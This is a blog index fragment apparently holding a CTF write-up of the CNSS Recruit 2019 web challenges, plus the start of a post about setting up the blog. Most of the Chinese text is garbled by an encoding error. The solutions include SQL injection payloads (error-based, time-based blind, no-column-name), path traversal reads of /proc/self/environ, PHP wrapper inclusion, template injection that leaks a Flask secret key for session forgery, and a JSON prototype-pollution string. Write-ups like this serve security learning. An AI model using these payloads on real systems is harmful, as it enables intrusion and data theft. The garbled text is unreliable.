ï¼Œå‘ç°æœ€å¤§é•¿åº¦ä¸º 8ï¼Œè€Œæˆ‘ä»¬çš„ç­”æ¡ˆæœ‰åä½ï¼Œä½†è¿™é‡Œé•¿åº¦é™åˆ¶åœ¨å‰ç«¯ï¼Œæ‰“å¼€ Burp Suite ä¸€é€šæŠ“åŒ…æ”¹åŒ…ï¼ˆä¹Ÿå¯å®¡æŸ¥å…ƒç´ ç›´æ¥æ”¹maxlengthï¼‰ï¼Œè¾“å…¥æ­£ç¡®ç­”æ¡ˆï¼ŒæˆåŠŸè·å– flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:2:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["CTF"],"content":"warm_up æ¥çƒ­ä¸ªèº«ï¼çœ‹åˆ°é¢˜ç›®å³æƒ³åˆ°ä¿®æ”¹ headerï¼Œè¿™é‡Œç”¨åˆ°äº† User-Agent ã€ X-Forwarded-For å’Œ Referer é¦–å…ˆåœ¨ User-Agent ä¸­æ·»åŠ  cnssï¼Œæˆ–ç›´æ¥å°†å…¶ä¸­æµè§ˆå™¨åç§°æ”¹ä¸º cnss PSï¼šè¿™é‡Œåº”æ³¨æ„ï¼Œä¸è¦å°† UA å†…å®¹å…¨éƒ¨åˆ é™¤åªå†™å…¥ cnssï¼Œè¿™æ ·æœ‰å¯èƒ½æœåŠ¡å™¨æ— æ³•è§£æè€Œæ‹¿ä¸åˆ° flag ç„¶åæ·»åŠ ä¸‹é¢ä¸¤å¥ X-Forwarded-For: 233.233.233.233 Referer: www.notcnss.com å°†åŒ…å‘å‡ºï¼ŒæˆåŠŸè·å– flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:3:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["CTF"],"content":"GAY' Profile ä¸€çœ¼æœ›å»ï¼Œå¥½GAYçš„é¢˜é¦–å…ˆçœ‹æºç ï¼Œå‘ç°å¦‚ä¸‹æ³¨é‡Š \u003c!-- Why not try to get /source ? --\u003e æœæ–­ url ååŠ  /sourceï¼Œæ‹¿åˆ°æºç ï¼Œå‘ç°åœ¨ /file ä¸­é€šè¿‡nameå‚æ•°å¯ä»¥è¯»å–æ–‡ä»¶ï¼Œç»“åˆ hint ä¸­æ‰€è¯´ flag åœ¨ /flag ä¸­æ„é€  url /file?name=../flag åˆ«é—®æˆ‘ä¸ºä»€ä¹ˆ flag åœ¨ä¸Šä¸€çº§ç›®å½•ï¼Œè¯•ä¸€è¯•å°±å‡ºæ¥äº†ï¼ˆé€ƒï¼ŒæˆåŠŸè·å– flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:4:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["CTF"],"content":"love_reading æ‹¿åˆ°è¿™é“é¢˜ï¼Œåªç»™äº†ä¸¤å¥è¯ï¼Œä¹ä¸€çœ‹æ¯”è¾ƒæ‡µ Evil robot take my love. I only know that he uses linux. ç»†ç»†åˆ†æè¿™ä¸¤å¥è¯ä¸­çš„æç¤ºï¼Œå‘ç° robot å’Œ linux åº”è¯¥æœ‰ä½œç”¨ å…ˆå°è¯•åœ¨ url åæ·»åŠ  /robots.txtï¼Œ å‡ºç°äº† s4cret.phpï¼Œç›´æ¥ä¿®æ”¹ urlï¼ŒæƒŠå–œçš„å‘ç°ä¸€ç‰‡ç©ºç™½ è¯» hint å‘ç° vim in linux ï¼Œçœ¼å‰ä¸€äº®ï¼Œå³æƒ³åˆ° vim äº§ç”Ÿçš„ä¸´æ—¶æ–‡ä»¶ åˆ†åˆ«å°è¯• /.s4cret.php.swp å’Œ /.index.php.swpï¼Œå‘ç° index.php å­˜åœ¨ä¸´æ—¶æ–‡ä»¶ï¼Œç”¨ vim è¿˜åŸï¼Œå¾—åˆ°æºç  if(!(isset($_GET['key']) \u0026\u0026 isset($_GET['f']))){ die(); } else{ $path = $_GET['key']; $data = file_get_contents($path); if($data != \"zhi ma kai men!\"){ die(\"no no nope\"); } $f = $_GET['f']; include($f); } æºç ä¸é•¿ï¼Œå‘ç°æœ‰ä¸¤ä¸ªå‚æ•° key å’Œ fï¼Œåˆ†åˆ«è°ƒç”¨ file_get_contents() å’Œ include()ï¼Œåº”ä»è¿™ä¸¤ä¸ªåœ°æ–¹å…¥æ‰‹ï¼Œç”±äºæ²¡æœ‰ä»»ä½•è¿‡æ»¤æœºåˆ¶ï¼Œæ•…ç›´æ¥è€ƒè™‘ PHP ä¼ªåè®® ç¬¬ä¸€ä¸ªå‚æ•°åº”ç”¨è‡ªå·±çš„è¾“å…¥ä»£æ›¿è·å–æ–‡ä»¶å†…å®¹ï¼Œå¯ç”¨ php://input åŠ  POST ä¼ å‚ç›´æ¥ç»•è¿‡ ç¬¬äºŒä¸ªå‚æ•°åº”ä¸º include() çš„ä»»æ„æ–‡ä»¶è¯»å–ï¼Œç”¨ php://filter å³å¯ æ•…æ„é€ ä»¥ä¸‹url /?key=php://input\u0026f=php://filter/convert.base64-encode/resource=s4cret.php ç„¶å Burp Suite æŠ“åŒ…ï¼Œè¯·æ±‚æ–¹æ³•æ”¹ä¸º POSTï¼Œè¯·æ±‚ä½“æ·»åŠ  zhi ma kai men!ï¼Œè·å¾—ä¸€æ®µ base64 ç¼–ç çš„æ–‡æœ¬ï¼ˆæˆ–ç›´æ¥é‡‡ç”¨ HackBar å‘é€ POST è¯·æ±‚ï¼‰ï¼Œè§£ç åå¯çœ‹åˆ°ä¸€æ®µç¥å¥‡çš„æ³¨é‡Šï¼ŒæˆåŠŸè·å¾—flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:5:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["CTF"],"content":"Gay Profile Plus ç»§ç»­ gayçœ‹æºç ï¼Œç»§ç»­ /sourceï¼Œå‘ç°åŠ äº†ä¸€æ®µç¥å¥‡çš„è¯­å¥ if os.path.abspath(filename).startswith(os.getcwd()) and filename != './profile': return 'No No No', 422 è¿™é‡Œå¤§æ¦‚æ„æ€æ˜¯ï¼Œå¦‚æœè¦è¯»å–çš„æ–‡ä»¶åœ¨å½“å‰å·¥ä½œç›®å½•ï¼Œé‚£ä¹ˆå®ƒå¿…é¡»æ˜¯ ./profileï¼Œä½†æ˜¯é¢˜ç›®å‘Šè¯‰æˆ‘ä»¬ flag åœ¨ ./flag ä¸­ï¼Œæ˜¾ç„¶ç›´æ¥è¯»å–å°±è¡Œä¸é€šäº†ï¼Œç”±æŠ“åŒ…å¯çŸ¥æœåŠ¡å™¨ä¸º Linuxï¼Œå¯è€ƒè™‘ /proc æ–‡ä»¶ç³»ç»Ÿ procæ–‡ä»¶ç³»ç»Ÿæ˜¯ä¸€ä¸ªä¼ªæ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒåªå­˜åœ¨å†…å­˜å½“ä¸­ï¼Œè€Œä¸å ç”¨å¤–å­˜ç©ºé—´ã€‚å®ƒä»¥æ–‡ä»¶ç³»ç»Ÿçš„æ–¹å¼ä¸ºè®¿é—®ç³»ç»Ÿå†…æ ¸æ•°æ®çš„æ“ä½œæä¾›æ¥å£ã€‚ç”¨æˆ·å’Œåº”ç”¨ç¨‹åºå¯ä»¥é€šè¿‡procå¾—åˆ°ç³»ç»Ÿçš„ä¿¡æ¯ï¼Œå¹¶å¯ä»¥æ”¹å˜å†…æ ¸çš„æŸäº›å‚æ•°ã€‚ç”±äºç³»ç»Ÿçš„ä¿¡æ¯ï¼Œå¦‚è¿›ç¨‹ï¼Œæ˜¯åŠ¨æ€æ”¹å˜çš„ï¼Œæ‰€ä»¥ç”¨æˆ·æˆ–åº”ç”¨ç¨‹åºè¯»å–procæ–‡ä»¶æ—¶ï¼Œprocæ–‡ä»¶ç³»ç»Ÿæ˜¯åŠ¨æ€ä»ç³»ç»Ÿå†…æ ¸è¯»å‡ºæ‰€éœ€ä¿¡æ¯å¹¶æäº¤çš„ã€‚ï¼ˆæºè‡ªç½‘ç»œï¼‰ ä¸€èˆ¬æ¥è¯´ /proc ç›®å½•ä¸‹æœ‰ä»¥ PID å‘½åçš„ç›®å½•ï¼Œå¯ä»¥é€šè¿‡æ­¤ç›®å½•è·å–è¿›ç¨‹æ‰€åœ¨ç›®å½•çš„æ–‡ä»¶ï¼Œä½†è¿™é‡Œæ˜¾ç„¶æ— æ³•è·å– PIDï¼Œä½†æºç ä¸­ os.getcwd() æé†’æˆ‘ä»¬è¦ç”¨å½“å‰å·¥ä½œç›®å½•ï¼Œäºæ˜¯æ„é€ ä»¥ä¸‹ url /file?name=/proc/self/cwd/flag æˆåŠŸè·å¾— flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:6:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["CTF"],"content":"baby_sql ä½œä¸º sqli çš„ç¬¬ä¸€é¢˜ï¼Œæœ¬é¢˜å¹¶ä¸éš¾ï¼Œæœªè¿›è¡Œä»»ä½•è¿‡æ»¤ï¼Œä½†æ·»åŠ äº† code å‚æ•°è¿›è¡ŒéªŒè¯ï¼Œé˜²æ­¢äº†ç›´æ¥ SqlMapï¼Œä½†åªéœ€è¿›è¡Œç®€å• union æŸ¥è¯¢æ³¨å…¥å³å¯ï¼Œä½†åº”æ³¨æ„ï¼Œæ­¤å¤„ä»…æ˜¾ç¤ºæŸ¥è¯¢çš„ç¬¬ä¸€æ¡ç»“æœï¼Œæ•…æŸ¥è¯¢æ—¶åº”ç»™äºˆä¸€ä¸ªæ— å†…å®¹çš„ id ä¾æ¬¡æŸ¥è¯¢åº“åã€è¡¨åã€å­—æ®µåï¼Œç›´æ¥æŸ¥è¯¢å³å¯ï¼ŒæˆåŠŸè·å¾— flag PSï¼šå¯é‡‡ç”¨ Python è„šæœ¬è‡ªåŠ¨è¾“å…¥ code å‚æ•°ï¼Œç¼©çŸ­æ“ä½œæ—¶é—´ï¼ˆå¦ä¸‰é“ sqli åŒç†ï¼‰ ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:7:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["CTF"],"content":"èŸ’è›‡-Login_in æ‰“å¼€å‘ç°ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œéœ€è¦æä¾›å¯†ç å’ŒéªŒè¯ç ï¼Œä¸”çŸ¥é“éªŒè¯ç MD5åçš„å‰ä¸‰ä½ï¼Œçœ‹æºç ï¼Œæœ‰ä»¥ä¸‹æ³¨é‡Š \u003c!--éªŒè¯ç ä¸€å…±4ä½æ•°å­—å­—æ¯ï¼Œå¯†ç éƒ½æ˜¯æ•°å­—ï¼ŒéªŒè¯ç æ­£ç¡®ä½ å°±çŸ¥é“å¯†ç ä½æ•°äº†--\u003e é‚£å°±å…ˆå†™ä¸€ä¸ªè®¡ç®—éªŒè¯ç çš„ python è„šæœ¬ å¾—åˆ°æ­£ç¡®çš„éªŒè¯ç å¹¶è¾“å…¥åï¼Œå¾—çŸ¥å¯†ç ä¸º4ä½æ•°å­—ï¼Œç”±äºæ²¡æœ‰ä»»ä½•å…¶ä»–æç¤ºï¼Œè¿™é‡Œé€‰æ‹©çˆ†ç ´æ³•ï¼Œåªéœ€ä» 0000 è¯•åˆ° 9999 å³å¯ï¼Œå°†ä¸Šé¢çš„è„šæœ¬è¿›è¡Œæ‰©å……ï¼ˆç”±äºéªŒè¯ç éšæœºï¼Œæ³¨æ„ä½¿ç”¨ sessionï¼Œä¸”æ³¨æ„ requests è·å–ç½‘é¡µçš„ç¼–ç æ ¼å¼ï¼‰ è¾“å…¥è·å–åˆ°çš„æ­£ç¡®å¯†ç å’ŒéªŒè¯ç ï¼ŒæˆåŠŸè·å¾— flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:8:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["CTF"],"content":"Gay Profile Plus Plus æ—¢ç„¶é¢˜å¹²å·²ç»è¯´äº†æ”¾åœ¨æ–‡ä»¶ä¸å®‰å…¨ï¼Œé‚£å°±ä¸å¯èƒ½ç›´æ¥ä»æœ¬åœ°æ–‡ä»¶è·å– flag äº†ï¼Œé‚£å¦‚ä½•æŠŠä¸€ä¸ªä¸œè¥¿å­˜å‚¨åœ¨æ–‡ä»¶ä¹‹å¤–å‘¢ï¼Ÿè¿™é‡Œæˆ‘ä»¬ç»§ç»­è€ƒè™‘ gay+ çš„æ—¶å€™ç”¨è¿‡çš„ /proc æ–‡ä»¶ç³»ç»Ÿï¼Œå› ä¸ºå®ƒå­˜åœ¨äºå†…å­˜ä¸­ï¼Œå½“ç„¶å°±ä¸æ˜¯æ–‡ä»¶äº† æŸ¥çœ‹ /proc æ–‡ä»¶ç³»ç»Ÿçš„å…·ä½“è¯´æ˜ï¼Œå‘ç°åœ¨è¿›ç¨‹ç›®å½•ä¸‹å­˜åœ¨ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼ŒçŒœæµ‹ flag å¯èƒ½å­˜åœ¨äºæ­¤ï¼Œæ•…æ„é€  url å¦‚ä¸‹ /file?name=/proc/self/environ å‘ç° flag æœç„¶åœ¨æ­¤ï¼ŒæˆåŠŸè·å¾— flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:9:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["CTF"],"content":"äº§å“ç»ç† æŸ¥çœ‹æºç ï¼Œåœ¨ db.php çš„æ³¨é‡Šä¸­å‘ç°ä»¥ä¸‹ sql è¯­å¥ ...namechar(64)...INSERTINTOproductsVALUES('cnss',sha256(....),'FLAG_HERE');... å¾—çŸ¥ name çš„é•¿åº¦æœ€å¤§ä¸º 64 ï¼Œ è€Œæˆ‘ä»¬éœ€è¦è·å– name ä¸º cnss å¤„çš„ description å› é¢˜å¹²è¯´äº†ä½¿ç”¨äº† PDO ï¼Œé¦–å…ˆæ’é™¤sqlæ³¨å…¥ è§‚å¯Ÿæºç ï¼Œå‘ç° get_product å’Œ check_name_secret åˆ†ç¦» function get_product($name) { global $db; $statement = $db-\u003eprepare( \"SELECT name, description FROM products WHERE name = ?\" ); ...} function check_name_secret($name, $secret) { global $db; $valid = false; $statement = $db-\u003eprepare( \"SELECT name FROM products WHERE name = ? AND secret = ?\" ); ...} å³éªŒè¯ name å’Œ secret å’Œè·å–ä¿¡æ¯å¹¶éåŒæ­¥è¿›è¡Œï¼Œè€Œè·å–ä¿¡æ¯æ—¶å¹¶ä¸éœ€è¦ secretï¼Œè€ƒè™‘åˆ° Mysql å¯¹å°¾ç©ºæ ¼çš„å¤„ç†ï¼Œadd ä»¥ä¸‹å†…å®¹ Name: cnss + ä»»æ„ç©ºæ ¼ Secret: ç¬¦åˆè¦æ±‚å³å¯ Description: ä»»æ„ æ‰§è¡Œ add æ“ä½œåï¼Œview ä»¥ä¸‹å†…å®¹ Name: cnss Secret: ä¸Šä¸€æ­¥è®¾ç½®çš„å¯†ç  æ‰§è¡Œ view æ“ä½œï¼ŒæˆåŠŸè·å¾— flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:10:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["CTF"],"content":"easy_sql ç»è¿‡è¯•éªŒï¼Œå‘ç°è®¸å¤šå­—ç¬¦è¢«å±è”½ï¼Œæ¯”è¾ƒé‡è¦çš„æœ‰ï¼ˆéƒ½æœ‰æ–¹æ³•ç»•è¿‡æˆ–ä¸ä½¿ç”¨ï¼‰ and - * ç©ºæ ¼ å…¶ä¸­ ç©ºæ ¼ å¯ç”¨ %0a ä»£æ›¿ï¼Œæ³¨é‡Šç¬¦å· -- å¯ç”¨ %23 ä»£æ›¿ ç”±äº and ä¸å¯ç”¨ï¼Œè¿™é‡Œè€ƒè™‘æŠ¥é”™æ³¨å…¥ï¼Œä¸”ç”±äº * ä¸å¯ç”¨ï¼Œè€ƒè™‘ xml çš„æŠ¥é”™ï¼Œç»æµ‹è¯•ï¼Œxml çš„æŠ¥é”™æ³¨å…¥å¯ç”¨ï¼Œæ•…æ„é€ å¦‚ä¸‹ payload 1%27%0aor%0a(extractvalue(1,concat(0x7e,(......),0x7e)))%23 åªéœ€å°† ...... å¤„ä¿®æ”¹ä¸ºæŸ¥è¯¢è¯­å¥ï¼Œå³å¯åœ¨æŠ¥é”™ä¸­çœ‹åˆ°æŸ¥è¯¢ç»“æœ ä¾æ¬¡æŸ¥è¯¢åº“åã€è¡¨åã€å­—æ®µåï¼ŒæˆåŠŸè·å¾— flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:11:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["CTF"],"content":"True_Love ä¸å¾—ä¸è¯´ï¼Œå‡ºé¢˜äººçœŸçš„æœ‰å¿ƒäº† ä½†æ˜¯å…ˆåˆ«çœ‹è¿™ä¸ªå¿ƒäº†çœ‹é¢˜å§ ä»ç¬¬ä¸€ä¸ªç•Œé¢ç›®æµ‹æ‰¾ä¸åˆ°ä»€ä¹ˆæœ‰ç”¨ä¿¡æ¯ï¼Œä¸å¦¨æ‰“å¼€é¢˜ç›®æ‰€è¯´çš„ /admin ï¼Œçœ‹åˆ°ä¸€ä¸ªç™»é™†ç•Œé¢ï¼Œä¸”ç¬¬ä¸€è¡Œå°±è¯´ åªæœ‰adminæ‰èƒ½æ‹¿åˆ°flag é‚£å°±è®©æˆ‘ä»¬æˆä¸º admin ä¸å°±å¥½äº† æŸ¥çœ‹ cookie å‘ç°ä¸€æ¡ session ï¼Œ base64è§£ç ï¼Œå‘ç°ç¬¬ä¸€æ®µä¸ºç”¨æˆ·åï¼Œè€ƒè™‘ session ä¼ªé€ ï¼Œè€Œç°åœ¨çš„é—®é¢˜åœ¨äºä¸çŸ¥é“å¯†é’¥ï¼Œé‚£å°±å…ˆæ‹¿åˆ°å¯†é’¥ éšä¾¿ä¿®æ”¹ / åçš„å†…å®¹ï¼Œå‘ç° 404 ç•Œé¢ä¸­æœ‰å‡ºé”™çš„ url ï¼Œç”±äºåç«¯ä¸º python ï¼Œå°è¯•æ¨¡æ¿æ³¨å…¥ï¼Œå…ˆæ„é€  {{1+1}} å¾—åˆ°ç»“æœ 2 ï¼Œæ¨¡æ¿æ„é€ æ¼æ´å­˜åœ¨ï¼Œç›´æ¥æ„é€  {{config}} ï¼Œå³å¯å¾—åˆ°å¯†é’¥ é€šè¿‡ flask æ¡†æ¶æ„é€  session ï¼Œæ›¿æ¢æœ¬é¢˜ç½‘é¡µä¸­çš„ sessionï¼Œåˆ·æ–°é¡µé¢å³å¯å‘ç° flag å‡ºç°åœ¨ url ä¸­ï¼ŒæˆåŠŸè·å¾— flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:12:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["CTF"],"content":"normal_sql æœ¬é¢˜éªŒè¯ç å˜æˆäº†ç»™å®šå…¶md5çš„å‰å››ä½ï¼Œæ— éæ˜¯å¢åŠ äº†äº›è„šæœ¬è¡Œæ•°å’Œè¿è¡Œæ—¶é—´ï¼Œé—®é¢˜ä¸å¤§ ä¾æ—§è¿‡æ»¤äº†ä¼—å¤šå­—ç¬¦ï¼Œä¸”å¹¶æ— é”™è¯¯ä¿¡æ¯ï¼Œæ•…è€ƒè™‘å»¶æ—¶ç›²æ³¨ï¼Œæ„é€ å¦‚ä¸‹ payload 1'and(if(ascii(substr((select(...)from(...)),index,1))\u003e0,1,sleep(3)))%23 ä¿®æ”¹ ... index å’Œ 0 å¤„çš„å€¼ï¼Œé€šè¿‡ç½‘é¡µåŠ è½½æ—¶é—´ï¼Œåˆ¤æ–­ç›²æ³¨ç»“æœ ä¾æ¬¡æŸ¥è¯¢åº“åã€è¡¨åã€å­—æ®µåï¼ŒæˆåŠŸè·å¾— flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:13:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["CTF"],"content":"Gay Profile Plus Plus Plus emmmâ€¦tsåç«¯å¯è¿˜è¡Œ æºç æä¾›äº†é‚£å°±ç›´æ¥åº·åº·ï¼Œå‘ç°åœ¨ /file ä¸­æœ‰ä»¥ä¸‹å†…å®¹ if (!file \u0026\u0026 !ctx.__proto__.name) { ctx.body = 'No No No...'; ctx.status = 422; return; } else if (file \u0026\u0026 file.indexOf('flag') !== -1){ ctx.body = 'No No No...'; ctx.status = 403; return; } else if (!file){ file = ctx.__proto__.name; } å¤§æ¦‚ä¸€çœ‹æˆ‘ä»¬å°±ä¼šå‘ç°ï¼Œflag åº”è¯¥æ˜¯æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œè€Œä½ ä¸èƒ½é€šè¿‡è¿™ä¸ªæ–‡ä»¶åè¯»å–å®ƒï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡ ctx.__proto__.name ç»§æ‰¿ name å±æ€§ï¼Œæ‰€ä»¥è€ƒè™‘åŸå‹é“¾æ±¡æŸ“ å†çœ‹ /save çš„éƒ¨åˆ†ï¼Œå¯ä»¥å‘ç°è¾“å…¥æ•°æ®ä¼šé€šè¿‡ JSON.parse è§£æï¼Œè¿™æ ·å°±ä¸ºæˆ‘ä»¬è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“æä¾›äº†å¯èƒ½ï¼Œæ•…æ„é€ ä»¥ä¸‹ JSONå­—ç¬¦ä¸² {\"type\": \"hhh\", \"content\": {\"constructor\": {\"prototype\": {\"name\": filename}}}} åªéœ€ä¿®æ”¹ filename çš„å€¼æäº¤ï¼Œå†åœ¨ /file å¤„å°† name ç•™ç©ºï¼Œå³å¯è¯»å–ä»»æ„æ–‡ä»¶ï¼Œé¦–å…ˆå°è¯• flag æ— æœï¼Œå†å°è¯• ../flag ï¼ŒæˆåŠŸè·å¾— flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:14:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["CTF"],"content":"hard_sql é¢˜å¹²ç›´æ¥å‘Šè¯‰æˆ‘ä»¬ Make it wrong ï¼Œé¦–å…ˆè€ƒè™‘çš„æ˜¯æŠ¥é”™æ³¨å…¥ï¼Œä½†æ˜¯é”™è¯¯ä¿¡æ¯æ ¹æœ¬æ²¡æœ‰å›æ˜¾ï¼Œå‡ºé”™åªä¼šæœ‰ Something wrong çš„æç¤º è¿™é‡Œå¯ä»¥è€ƒè™‘è®©å…¶åœ¨ç‰¹å®šæƒ…å†µä¸‹æŠ¥é”™ï¼Œé¦–å…ˆè€ƒè™‘ if ï¼Œå‘ç°è¢«è¿‡æ»¤ï¼Œäºæ˜¯ä½¿ç”¨ case when çš„ç”¨æ³• æ„é€ ä»¥ä¸‹ payload 1' and case (ascii(substr((something),index,1))) when asc then pow(999,999) end %23 è¿™é‡Œæ³¨æ„ select å’Œ information ä¼šè¢«è¿‡æ»¤ï¼Œä½†åªéœ€é€šè¿‡å¤§å°å†™å˜åŒ–ç»•è¿‡å³å¯ ä¸Šè¿°è¯­å¥åœ¨æŸ¥è¯¢çš„å­—ç¬¦çš„ ascii ç­‰äºç»™å‡ºçš„æ•°å­—æ—¶ï¼Œæ‰ä¼šæ‰§è¡Œ pow(999,999) ï¼Œæ­¤æ—¶æ‰ä¼šäº§ç”ŸæŠ¥é”™ é€šè¿‡ä¿®æ”¹ something index å’Œ asc å¯ä»¥çˆ†å‡ºåº“åå’Œè¡¨åï¼Œä½†å½“å°è¯•çˆ†å‡ºå­—æ®µåçš„æ—¶å€™å‘ç° column è¢«è¿‡æ»¤ä¸”æ— æ³•ç»•è¿‡ï¼Œæ‰€ä»¥å°è¯•æ— åˆ—åæ³¨å…¥ï¼ˆè™½ç„¶æˆ‘ä¹Ÿä¸æ‡‚ä¸ºä»€ä¹ˆæ— åˆ—åæ³¨å…¥çš„é¢˜åªæœ‰ä¸€åˆ—ï¼Œä½†æ˜¯è¿˜æ˜¯è¿™ä¹ˆåšäº†ï¼‰,å°† something æ”¹ä¸ºå¦‚ä¸‹ payload å³å¯è¿›è¡Œæ— åˆ—åæ³¨å…¥ Select`1`from(Select1unionselect*fromdatabase_name.table_name)asalimit1,1 ä¾æ¬¡çˆ†å‡º flag çš„æ¯ä¸€ä½å³å¯ï¼ŒæˆåŠŸè·å¾— flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:15:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["CTF"],"content":"[BOSS] Get Me Inside Get â™‚ Me â™‚ Inside ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:16:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["å¿ƒè·¯å†ç¨‹"],"content":"0x00 å‰è¨€ å‰å‡ å¤©å¿ƒè¡€æ¥æ½®æƒ³æ­ä¸ªåšå®¢ï¼Œå¯ä¸‡ä¸‡æ²¡æƒ³åˆ°ï¼Œæ­ä¸ªåšå®¢å¦‚æ­¤ä»¤äººæ„‰(beng)æ‚¦(kui)ï¼Œæ¥è®©æˆ‘ä»¬ä»å¤´è¯´èµ·ğŸ˜­ ","date":"2019-10-23","objectID":"/posts/build-my-blog/:1:0","tags":["Blog"],"title":"åšå®¢æ­å»ºè¡€æ³ªå²","uri":"/posts/build-my-blog/"},{"categories":["å¿ƒè·¯å†ç¨‹"],"content":"0x01 Whereï¼Ÿ æ­å»ºåšå®¢ä¸€èˆ¬æœ‰ä¸¤ç§é€‰æ‹©ï¼šGitHub Page æˆ–è€… è‡ªå·±çš„æœåŠ¡å™¨(VPS)ã€‚ç¬¬ä¸€ç§æ–¹æ³•æ“ä½œç®€å•ï¼Œè€Œä¸”ä¸è¦é’±ï¼Œä½†åªèƒ½ä½¿ç”¨é™æ€ç½‘ç«™ï¼Œå¯ä»¥æ­é… Hexo ç­‰é™æ€ç½‘ç«™ç”Ÿæˆå™¨ï¼Œä½†æ˜¯ç”±äºä¸€äº›ç‰¹æ®Šçš„åŸå› ï¼Œè¿™é‡Œæˆ‘é‡‡ç”¨äº†ç¬¬äºŒç§æ–¹æ³• Github Page çœŸé¦™ï¼ˆç”¨äº† Custom domainï¼‰ã€‚ VPS æœåŠ¡å•†æˆ‘é€‰æ‹©äº†è€ç‰Œå¤§å‚ Vultr ï¼Œä¸€ä¸ªä¸€ä¸ªè¯• IP å¯æ˜¯çœŸçš„å¿«â™‚ä¹ï¼ˆæ‰‹åŠ¨æ»‘ç¨½ï¼‰ï¼Œç»è¿‡æ— æ•°æ¬¡å°è¯•ï¼Œè‹å¤©ä¸è´Ÿæœ‰å¿ƒäººï¼Œç»ˆäºç»™æˆ‘ä¸ªèƒ½ç”¨çš„äº†ï¼Œç„¶å LNMP ä¸€æ¡é¾™ï¼ŒæœåŠ¡å™¨æ–¹é¢åŸºæœ¬ OKã€‚ ç„¶åæ˜¯åŸŸåï¼Œä¾æ—§æ˜¯ä¸ªè€ç‰Œå¤§å‚ GoDaddy ï¼Œæå®ŒåŸŸåéšæ‰‹æŒ‚åœ¨ CloudFlare ä¸Šï¼Œçˆ½æ­ªæ­ªã€‚ è‡³æ­¤ï¼Œç¬¬ä¸€ä¸ªé—®é¢˜ â€œWhere?â€ è§£å†³ã€‚ ","date":"2019-10-23","objectID":"/posts/build-my-blog/:2:0","tags":["Blog"],"title":"åšå®¢æ­å»ºè¡€æ³ªå²","uri":"/posts/build-my-blog/"},{"categories":["å¿ƒè·¯å†ç¨‹"],"content":"0x02 Howï¼Ÿ è¯´èµ·æ€ä¹ˆå»ºç«™ï¼Œè¿™å¯çœŸçš„æ˜¯è¡€æ³ªå²çš„æ¥å†ã€‚ æ­å»ºåšå®¢ä¸€èˆ¬åˆæœ‰ä¸¤ç§é€‰æ‹©ï¼šåŠ¨æ€ç½‘ç«™ å’Œ é™æ€ç½‘ç«™ã€‚å½“ç„¶åˆç”±äºå¯¹æŠ€æœ¯çš„å‘å¾€ï¼ˆè¿™æ¬¡æ˜¯çœŸçš„å‘å¾€ï¼‰ï¼Œåæ‰‹å°±æ˜¯ä¸€ä¸ª Wordpress ï¼ˆå®‰è£…æå…¶å®¹æ˜“ï¼Œè½»æ¾å¼€å§‹ Blog ç”Ÿæ´»ï¼‰ã€‚ å¥½äº†è£…æ˜¯è£…å®Œäº†ï¼Œå«Œé…ç½®éº»çƒ¦å¯èƒ½æ˜¯å› ä¸ºæˆ‘å¤ªèœäº†ï¼Œä½†æ˜¯ï¼Œä½ å®˜æ–¹ä¸»é¢˜è¿˜èƒ½å†ä¸‘ä¸€ç‚¹å—ï¼Œä½ è¯´å¥½çš„åšå®¢å¹³å°ä½ 